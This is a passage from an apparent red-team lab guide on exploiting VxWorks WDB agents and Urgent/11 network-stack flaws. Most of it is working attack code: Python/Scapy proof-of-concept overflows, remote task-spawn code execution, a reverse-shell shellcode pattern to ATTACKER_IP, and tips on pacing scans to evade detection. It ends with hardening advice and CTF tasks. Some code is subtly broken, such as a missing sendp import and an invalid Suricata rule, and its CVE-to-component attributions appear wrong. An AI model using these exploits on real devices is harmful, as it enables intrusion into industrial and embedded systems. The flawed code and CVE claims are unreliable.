### 7.3 Calling a Native Function

The simplest RCE demonstration calls `printf` with a known string address:

```bash
# 1. Find printf address in sym table (suppose 0x00114520)
# 2. Find address of a string in target RAM (e.g., from CTX_READ output)
#    Suppose "Hello from WDB\n" is at 0x00200040

python3 wdb_task_spawn.py --target 192.168.99.100 \
    --func 0x00114520 --args 0x00200040
# Spawned task pwn (ID=0x00201034) executing 0x00114520
# The target's console (or serial output if you have UART attached) now shows:
# Hello from WDB
```

### 7.4 Deploying Custom Shellcode

For arbitrary code execution beyond calling existing functions:

1. Use `wdb_ctx_write.py` to write a shellcode blob to a known RAM address (e.g., `0x00200000`).
2. Use `wdb_task_spawn.py` to spawn a task with `--func 0x00200000`.

ARM Cortex-R reverse-shell shellcode pattern (pseudocode; full assembly omitted):

```
1. socket(AF_INET, SOCK_STREAM, 0)  // returns socket fd in r0
2. connect(fd, sockaddr_in{ATTACKER_IP, ATTACKER_PORT}, 16)
3. dup2(fd, 0); dup2(fd, 1); dup2(fd, 2)
4. execve("/shell", {NULL}, NULL)   // VxWorks targetShell or similar
```

VxWorks does not have `/bin/sh` — the equivalent is `shellCmd` or `targetShell`. If neither is present in the build, the shellcode must implement its own minimal command parser.

---

## 8. Urgent/11 Case Studies

This section reproduces four Urgent/11 CVEs against the lab target. Each PoC is in `/lab/vxworks/pocs/`.

### 8.1 CVE-2019-12256 — WDB RPC Parser Stack Overflow

**Affected component**: `wdbDbgArchLib.c`, `wdbDbgArchEvtGet` function.
**Trigger**: Oversized "info" field in an `EVENT_GET` (proc 9) request.
**Impact**: Stack-based buffer overflow; RCE via ROP.
**Authentication**: None required (the parser runs before the auth check).

```python
#!/usr/bin/env python3
# cve_2019_12256_poc.py — Stack overflow in WDB EVENT_GET info field
import socket, struct

TARGET = '192.168.99.100'
PORT = 17185
WDB_PROC_EVENT_GET = 9

# Craft an EVENT_GET request with an oversized info field
# The vulnerable buffer is 64 bytes on the stack; we send 512 bytes to overflow
# into the saved frame pointer and return address.
overflow_payload = b'A' * 64       # fill the local buffer
overflow_payload += b'B' * 4       # overwrite saved frame pointer
overflow_payload += b'C' * 4       # overwrite return address
overflow_payload += b'D' * 440     # padding to 512 bytes

# Build the EVENT_GET RPC request
header = struct.pack('>IIIIIIIIII',
    0x41414141, 0, 2, 0x55555555, 1, WDB_PROC_EVENT_GET,
    0, 0, 0, 0)

# EVENT_GET payload: context type, context id, info, info length
payload = struct.pack('>II', 1, 0)             # SYSTEM context
payload += struct.pack('>I', len(overflow_payload))
payload += overflow_payload

packet = header + payload

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3.0)
s.sendto(packet, (TARGET, PORT))
try:
    reply, _ = s.recvfrom(65535)
    print(f"Reply: {reply.hex()[:64]}...")
except socket.timeout:
    print("No reply — target may have crashed (overflow successful)")
```

**Lab verification**: After running this PoC, the QEMU target should crash with a Memory Manage fault or jump to the controlled return address (0x43434343). Verify in the QEMU monitor:

```
(qemu) info registers
...
R15 = 0x43434343   <-- PC = controlled
```

### 8.2 CVE-2019-12258 — Memory Pool Allocator Overflow

**Affected component**: `memPartAlloc` in `memPartLib.c`.
**Trigger**: Oversized string passed to a network service that calls `memPartAlloc` (e.g., DNS resolver hostname, DHCP option 12 hostname).
**Impact**: Heap overflow; RCE via heap metadata corruption.
**Authentication**: None.

```python
#!/usr/bin/env python3
# cve_2019_12258_poc.py — memPartAlloc overflow via DHCP hostname option
from scapy.all import Ether, IP, UDP, BOOTP, BOOTP, DHCP

TARGET_MAC = '52:54:00:12:34:56'   # QEMU default NIC MAC
ATTACKER_IFACE = 'virbr-vxw'

# Oversized DHCP option 12 (hostname) — 256 bytes overflows the memPartAlloc buffer
oversized_hostname = b'A' * 256

dhcp_offer = (
    Ether(src='00:11:22:33:44:55', dst=TARGET_MAC) /
    IP(src='192.168.99.1', dst='192.168.99.100') /
    UDP(sport=67, dport=68) /
    BOOTP(op=2, yiaddr='192.168.99.100', siaddr='192.168.99.1',
          chaddr=bytes.fromhex('525400123456')) /
    DHCP(options=[
        ('message-type', 'offer'),
        ('server_id', '192.168.99.1'),
        ('lease_time', 86400),
        ('hostname', oversized_hostname),       # <-- overflow trigger
        'end',
    ])
)

sendp(dhcp_offer, iface=ATTACKER_IFACE, verbose=1)
```

### 8.3 CVE-2019-12260 — DHCPv4 Client Buffer Overflow

**Affected component**: `dhcpClientOptionGet` in `dhcpClientLib.c`.
**Trigger**: Malicious DHCP OFFER with oversized option 119 (domain search list).
**Impact**: Stack overflow; RCE.
**Authentication**: None (the target accepts DHCP offers from any responding server).

```python
#!/usr/bin/env python3
# cve_2019_12260_poc.py — DHCP option 119 (domain search) overflow
from scapy.all import *

TARGET_MAC = '52:54:00:12:34:56'
ATTACKER_IFACE = 'virbr-vxw'

# Option 119 (Domain Search List) RFC 3397
# Format: length-prefixed DNS-compressed domain names
# Vulnerable code parses this without bounds-checking into a 256-byte stack buffer
oversized_opt119 = b'\x07' + b'A' * 7 + b'\x00' + b'B' * 300

# Scapy doesn't have a direct DHCP option 119 helper, so build it manually
dhcp_offer = (
    Ether(src='00:11:22:33:44:55', dst=TARGET_MAC) /
    IP(src='192.168.99.1', dst='192.168.99.100') /
    UDP(sport=67, dport=68) /
    BOOTP(op=2, yiaddr='192.168.99.100', siaddr='192.168.99.1',
          chaddr=bytes.fromhex('525400123456')) /
    DHCP(options=[
        ('message-type', 'offer'),
        ('server_id', '192.168.99.1'),
        ('lease_time', 86400),
        (119, oversized_opt119),   # <-- overflow trigger
        'end',
    ])
)

sendp(dhcp_offer, iface=ATTACKER_IFACE, verbose=1)
```

### 8.4 CVE-2019-12264 — TCP Urgent Pointer (OOB) Flaw

**Affected component**: `tcpIn()` and `tcpOobHandle()` in `tcpLib.c`.
**Trigger**: TCP segment with URG flag set and urgent pointer exceeding segment boundary.
**Impact**: Out-of-bounds read; potential RCE.
**Authentication**: Requires a TCP connection to any VxWorks service (Telnet 23, FTP 21, HTTP 80).

```python
#!/usr/bin/env python3
# cve_2019_12264_poc.py — TCP urgent pointer OOB handling flaw
from scapy.all import *

TARGET = '192.168.99.100'
PORT = 23  # Telnet — any TCP service works

# Establish a TCP connection
syn = IP(dst=TARGET)/TCP(sport=12345, dport=PORT, flags='S', seq=1000)
syn_ack = srp1(Ether()/syn, verbose=0)
ack_seq = syn_ack[TCP].seq + 1

ack = IP(dst=TARGET)/TCP(sport=12345, dport=PORT, flags='A', seq=1001, ack=ack_seq)
sendp(Ether()/ack, verbose=0)

# Send a TCP segment with URG flag and an urgent pointer exceeding the segment
urg_pkt = (
    IP(dst=TARGET) /
    TCP(sport=12345, dport=PORT, flags='UAP',
        seq=1001, ack=ack_seq,
        urgptr=0xFFFF) /   # <-- Urgent pointer = 65535, exceeds segment length
    b'A' * 10              # Only 10 bytes of actual payload
)
sendp(Ether()/urg_pkt, verbose=0)

# VxWorks 6.9.3 will read beyond the segment buffer, potentially leaking
# adjacent kernel memory or crashing
```

---

## 9. Detection and Defense Bypass

### 9.1 Network-Level Detection

A mature SOC should detect WDB probes. Indicators:

| Indicator | Detection Method |
|-----------|------------------|
| UDP 17185 traffic | NetFlow, Zeek `weird.log`, Suricata rule `alert udp any any -> any 17185` |
| RPC program `0x55555555` in portmap query | Snort rule on port 111 with `0x55555555` payload pattern |
| Large UDP packets to 17185 (>512 bytes) | Suricata rule with `dsize:>512` |
| TCP 17185 connection from non-Momentics IP | Firewall allowlist |

Suricata rule example:

```
rule vxworks_wdb_probe {
    udp dport 17185;
    content:"|55 55 55 55|";   # WDB program number
    depth:16; offset:12;
    sid:1000001;
    rev:1;
    msg:"VxWorks WDB RPC probe";
    classtype:attempted-recon;
}
```

### 9.2 Bypass via Slow Scanning

A red team should not probe WDB with a single nmap UDP packet. Distribute probes across source IPs, ports, and times to blend into baseline traffic:

```python
import random, time
TARGETS = ['192.168.99.100']
for target in TARGETS:
    # Delay 30-90 minutes between probes
    time.sleep(random.uniform(1800, 5400))
    # Use a randomized source port
    sport = random.randint(1024, 65535)
    # ... send probe ...
```

### 9.3 Defense: Disabling WDB in Production

The Wind River recommendation (and the post-Urgent/11 hardening guidance):

```c
// In usrAppInit.c or the BSP kernelConfig.h:
#undef INCLUDE_WDB
#define INCLUDE_WDB FALSE

// Alternatively, leave WDB compiled in but force MODE_PASSWORD at boot:
#include <wdb/wdbDbgLib.h>
STATUS usrAppInit(void) {
    wdbConfig(WDB_MODE_PASSWORD, "your-32-char-password-here");
    return OK;
}
```

A password-protected WDB agent is still a target — the password is a 32-byte ASCII string transmitted in cleartext over UDP 17185. Anyone with a packet capture can recover it. The real fix is `INCLUDE_WDB = FALSE` in production kernels.

### 9.4 Defense: Network Segmentation

Place any device that requires WDB (e.g., for field service) behind a protocol-aware firewall that drops UDP 17185 except from explicitly allowlisted engineering workstation IPs. This is the practical mitigation when the OEM cannot upgrade VxWorks (certified platforms, frozen BOMs).

---

## 10. Capture-the-Flag Scenarios

Three CTF scenarios built on this lab. Use these for training or to validate your own methodology.

### Scenario A: "Find the WDB Agent" (15 minutes, easy)

**Setup**: A QEMU VxWorks target is running on `192.168.99.100`. The participant has Kali and the toolchain from §2.

**Objective**: Identify that the target is VxWorks and that WDB is reachable.

**Flags**:
1. Report the VxWorks version string (e.g., `VxWorks 6.9.3.0`).
2. Report the RPC program number and version.
3. Report the WDB authentication mode (`MODE_ANY` / `MODE_LOCAL` / `MODE_PASSWORD`).

**Solution sketch**: `nmap -sU -p 17185`, then `python3 wdb_probe.py` (see payloads.md §3), then dump the `wdbAuthMode` symbol via CTX_READ.

### Scenario B: "Dump the Config" (45 minutes, medium)

**Setup**: Same target. The participant has working CTX_READ primitive.

**Objective**: Use CTX_READ to locate and dump:
1. The VxWorks boot line (TFTP server IP, image path).
2. The system hostname (`sysBootLine` parsed hostname).
3. Any DHCP lease table entries.

**Flags**:
1. Report the TFTP server IP from the boot line.
2. Report the DHCP lease table contents (IP, MAC, hostname, lease expiry) for at least one entry.

**Solution sketch**: Use `strings` on the QEMU image to locate the symbol table offset; parse the sym table to find `sysBootLine`, `dhcpClientLeaseTable`; CTX_READ each.

### Scenario C: "Spawn a Shell" (90 minutes, hard)

**Setup**: Same target. The participant has CTX_READ, CTX_WRITE, and TASK_SPAWN primitives working.

**Objective**: Achieve interactive remote code execution via TASK_SPAWN.

**Flags**:
1. Spawn a task that calls `printf` with a chosen message; capture the message in the QEMU serial log.
2. Spawn a task that calls `shellCmd` (if present) with an attacker-supplied command string; capture the command output.
3. Deploy custom shellcode (via CTX_WRITE) that opens a reverse TCP shell to the attacker host; verify with `nc -l -p 4444` on the attacker host.

**Solution sketch**: Find `printf`, `shellCmd`, and `socket`/`connect`/`dup2` addresses in the sym table; build TASK_SPAWN requests with appropriate function pointers; for the reverse shell, write shellcode via CTX_WRITE then spawn with the shellcode address as the function pointer.

---

## 11. References and Further Reading

### Primary Sources

- **JSOF Urgent/11 Technical Advisory**: https://www.jsof-tech.com/urgent11/ — the original disclosure site with whitepaper, CVE list, and affected-version matrix.
- **Wind River PSIRT Advisory WINDPSIRT-2019-0327-1**: https://www.windriver.com/psirt — the vendor advisory listing all 11 Urgent/11 CVEs and the patched versions.
- **CVE-2019-12256 NVD Entry**: https://nvd.nist.gov/vuln/detail/CVE-2019-12256 — stack overflow in WDB RPC parser.
- **CVE-2019-12258 NVD Entry**: https://nvd.nist.gov/vuln/detail/CVE-2019-12258 — memory pool allocator overflow.
- **CVE-2019-12260 NVD Entry**: https://nvd.nist.gov/vuln/detail/CVE-2019-12260 — DHCPv4 client overflow.
- **CVE-2019-12264 NVD Entry**: https://nvd.nist.gov/vuln/detail/CVE-2019-12264 — TCP urgent pointer OOB flaw.

### Community Tools and Writeups

- **dark-lbp/vxworks_wdb**: https://github.com/dark-lbp/vxworks_wdb — Python WDB RPC client and PoC suite.
- **arp339 VxWorks WDB Protocol Writeup**: https://www.arp339.com/posts/vxworks-wdb-protocol/ — community reverse engineering of the WDB protocol.
- **Armis Labs "Urgent/11" Analysis**: https://www.armis.com/resources/iot-vulnerabilities/urgent11/ — independent technical analysis.
- **F-Secure Urgent/11 Field Notes**: https://blog.f-secure.com/urgent11-vxworks-vulnerabilities/ — field-deployment impact assessment.

### Wind River Documentation

- **VxWorks 6.9 Kernel Programmer's Guide**: Wind River documentation on the WIND IP stack, WDB agent architecture, and kernel configuration.
- **VxWorks Security Profile (CSP) Guide**: hardening guidance released post-Urgent/11.
- **Workbench User's Guide**: the Momentics/Workbench IDE that speaks WDB; reading the IDE's WDB client code is the canonical way to learn the protocol.
- **VxWorks 7 Security Center**: https://www.windriver.com/announcements/wind-river-launches-security-center/ — vendor security resources.

### Standards and Background

- **RFC 5531 (ONC RPC Version 2)**: https://tools.ietf.org/html/rfc5531 — the Sun RPC specification that WDB is built on.
- **RFC 1832 (XDR)**: https://tools.ietf.org/html/rfc1832 — External Data Representation used by WDB payloads.
- **RFC 3397 (DHCP Domain Search Option)**: https://tools.ietf.org/html/rfc3397 — option 119 specification (CVE-2019-12260).
- **IEEE Std 1003.1 (POSIX)**: VxWorks 6.x Real Time Process (RTP) API is loosely POSIX-derived; the WDB agent exposes both the VxWorks-native and POSIX-compatible APIs.

### Related kali-claw Guides

- `guides/embedded-rtos-security-playbook.md` — the broader red team playbook covering all RTOS families (QNX, FreeRTOS, ThreadX, Zephyr) with hardware lab setup.
- `skills/firmware-reverse/SKILL.md` — firmware extraction methodology (binwalk, sasquatch, jefferson) used to acquire the VxWorks image in the first place.
- `skills/hardware-security/SKILL.md` — JTAG/UART/SWD enumeration methodology for cases where the WDB agent is disabled but the physical debug interface is exposed.
- `skills/exploit-development/SKILL.md` — ROP chain construction, heap feng shui, and shellcode methodology for VxWorks targets.
- `skills/scada-ics-security/SKILL.md` — Schneider Modicon PLCs (M340, M580) run VxWorks; this guide covers the WDB agent underneath, scada-ics-security covers the Modbus function code surface above.

---

End of `embedded-rtos-security-deep-dive.md`. For the broader RTOS engagement workflow, see `embedded-rtos-security-playbook.md`. For the full command catalogue, see `payloads.md`. For the structured test cases, see `test-cases.md`.
